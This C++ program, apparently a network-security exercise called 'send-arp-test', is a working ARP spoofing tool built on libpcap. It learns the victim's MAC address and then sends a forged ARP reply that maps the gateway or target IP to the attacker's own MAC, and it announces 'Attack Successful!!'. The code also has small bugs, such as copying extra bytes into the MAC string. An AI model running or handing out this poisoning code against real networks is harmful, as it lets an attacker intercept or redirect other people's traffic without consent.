//#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <string>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdio.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

EthArpPacket packet_maker(string eth_dmac, string eth_smac, uint16_t op, string arp_smac, string arp_sip, string arp_tmac, string arp_tip){
	EthArpPacket packet;
	//ether header
	packet.eth_.dmac_ = Mac(eth_dmac);
	packet.eth_.smac_ = Mac(eth_smac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	//arp header
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	
	packet.arp_.op_ = htons(op);
	
	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));

	packet.arp_.tmac_ = Mac(arp_tmac);
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	return packet;

}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	string ip_sender = argv[2];
	string ip_target = argv[3];

	//char ip_mine[40];
	string ip_mine = "";
	string mac_mine = "";
	
	unsigned char mac_sender[32] = {0,};
	string mac_target = "";

	unsigned char* mac_unknown;
	char temp[32] = {0,};
	struct ifreq req;

	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	req.ifr_addr.sa_family = AF_INET;
	strncpy(req.ifr_name, argv[1], IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &req);

	mac_unknown = (unsigned char*)req.ifr_hwaddr.sa_data;
	sprintf((char*)temp, (const char*)"%02x:%02x:%02x:%02x:%02x:%02x", mac_unknown[0], mac_unknown[1], mac_unknown[2], mac_unknown[3], mac_unknown[4], mac_unknown[5]);
	mac_mine = temp;
	printf("mac : %s\n", mac_mine.c_str());

	ioctl(fd, SIOCGIFADDR, &req);
	//inet_ntop(AF_INET, req.ifr_addr.sa_data+2, ip_mine, sizeof(struct sockaddr));
	ip_mine  = inet_ntoa(((struct sockaddr_in*)&req.ifr_addr)->sin_addr);

	printf("ip : %s\n",ip_mine.c_str());
	EthArpPacket start = packet_maker("ff:ff:ff:ff:ff:ff", mac_mine, 1, mac_mine, ip_mine, "00:00:00:00:00:00", ip_sender);
	//EthArpPacket packet;

	//packet.eth_.dmac_ = Mac("00:0f:00:80:64:ec");
	//packet.eth_.smac_ = Mac("00:0f:00:00:0b:0f");
	//packet.eth_.type_ = htons(EthHdr::Arp);

	//packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	//packet.arp_.pro_ = htons(EthHdr::Ip4);
	//packet.arp_.hln_ = Mac::SIZE;
	//packet.arp_.pln_ = Ip::SIZE;
	//packet.arp_.op_ = htons(ArpHdr::Reply);
	//packet.arp_.smac_ = Mac("00:0f:00:00:0b:0f");
	//packet.arp_.sip_ = htonl(Ip("192.168.192.188"));
	//packet.arp_.tmac_ = Mac("00:0f:00:80:64:ec");
	//packet.arp_.tip_ = htonl(Ip("192.168.192.223"));
	
	while (1){
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&start), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		struct pcap_pkthdr* hdr;
		const u_char* second;
		int res_next = pcap_next_ex(handle, &hdr, &second);

		struct ether_header* eth;
		eth = (struct ether_header*)second;

		if (eth->ether_type == htons(0x0806)){
			struct ether_arp* arp_;
			arp_ = (struct ether_arp*)(second + sizeof(ether_header));
			unsigned char mac_tmp[6];
			memcpy(mac_tmp, arp_->arp_sha, sizeof(mac_tmp));
			sprintf((char*)mac_sender, (const char*) "%02x:%02x:%02x:%02x:%02x:%02x", mac_tmp[0], mac_tmp[1], mac_tmp[2], mac_tmp[3], mac_tmp[4], mac_tmp[5]);
			break;
		}
	}
	string fin_mac_sender = "";
	for (int i = 0; i < 21; i++) {
		fin_mac_sender += mac_sender[i];
	}
	EthArpPacket atk = packet_maker(fin_mac_sender, mac_mine, 2, mac_mine, ip_target, fin_mac_sender, ip_sender);
	int res_fin = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atk), sizeof(EthArpPacket));
	if (res_fin != 0 )
	{
		fprintf(stderr, "pcap_sendpakcet return %d error = %s\n", res_fin, pcap_geterr(handle));
		return -1;
	}
	printf("Attack Successful!!\n");

	pcap_close(handle);
}
